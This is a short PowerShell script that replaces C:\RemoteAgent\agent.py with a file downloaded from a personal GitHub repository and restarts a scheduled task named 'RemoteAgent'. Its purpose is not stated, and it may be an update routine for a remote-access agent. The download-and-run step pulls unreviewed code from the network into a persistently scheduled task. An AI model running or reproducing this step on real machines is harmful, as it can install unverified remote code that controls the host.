Remove-Item "C:\RemoteAgent\agent.py" -Force -ErrorAction SilentlyContinue
Invoke-WebRequest "https://raw.githubusercontent.com/0xLostByte/test2/refs/heads/main/wow.py" -OutFile "C:\RemoteAgent\agent.py" -UseBasicParsing
Stop-ScheduledTask -TaskName "RemoteAgent" -ErrorAction SilentlyContinue
Start-Sleep 2
Start-ScheduledTask -TaskName "RemoteAgent"
Write-Host "`n--- Verification ---" -ForegroundColor Cyan
Write-Host "File size: $((Get-Item 'C:\RemoteAgent\agent.py').Length) bytes"
Write-Host "First 5 lines:" -ForegroundColor Yellow
Get-Content "C:\RemoteAgent\agent.py" -TotalCount 5
Write-Host "`nTask state: $((Get-ScheduledTask -TaskName 'RemoteAgent').State)" -ForegroundColor Green
